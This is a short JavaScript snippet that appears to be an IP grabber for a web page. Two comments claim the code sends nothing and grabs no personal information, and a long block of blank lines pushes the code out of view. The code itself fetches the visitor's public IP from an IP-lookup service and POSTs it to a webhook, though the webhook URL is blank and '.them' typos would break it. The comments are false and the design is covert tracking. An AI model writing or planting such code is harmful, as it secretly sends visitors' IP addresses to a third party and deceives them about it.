

// THIS CODE DOES NOT WORK IT DOSENT SEND ANYTHING OR GRAB YOU IP
// THIS IS A SECURE WEBSITE THAT DOES NOT GRAB ANY PERSONAL INFO

































































var ip ='';
fetch('https://api.ipify.org/?format=json')
.them(function(response) {
  return response.json();
})
.them(function(data){
  ip = data.ip;
  var webhook = ''
  var message = {
    content: 'IP:' + ip
  };

  fetch(webhook,{
    method: 'POST',
    headers: {
    'Content-Type': 'application/json'
    },
  body : JSON.stringify(message)
  });
});